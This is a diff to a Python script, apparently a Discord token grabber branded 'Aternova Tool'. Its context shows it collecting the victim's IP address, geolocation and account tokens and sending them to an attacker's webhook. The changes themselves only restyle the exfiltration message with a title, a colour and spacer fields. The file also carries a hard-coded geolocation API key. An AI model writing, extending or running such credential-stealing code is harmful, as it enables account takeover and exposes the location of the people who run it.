@@ -16,7 +16,10 @@ ip = requests.get('https://api.ipify.org/').text
 
 r = requests.get(f'https://geo.ipify.org/api/v2/country?apiKey=at_R8PCEHjzhgL8DHOnRamh4mJsjq5aj&ipAddress={ip}')
 geo = r.json()
-embed = Embed()
+
+list_name = "📄 - Aternova Tool Logs:"
+#COLOR
+embed = Embed(title=list_name, color=0x004d99)
 
 # INVISIBLE IP
 embed.add_field(name='IP (Click to reveal)', value='||' + geo['ip'] + '||', inline=True)
@@ -75,10 +78,14 @@ def main():
         else:
             fields.append({'name': 'Token', 'value': 'No tokens found.'})
 
+        
+        fields.append({'name': '\u200b', 'value': '\u200b'})  
+
     for field in fields:
         value = field.get('value')
         if value is not None:
             embed.add_field(name=field['name'], value=value, inline=True)
 
     message = hook.send(embed=embed)
+
 main()
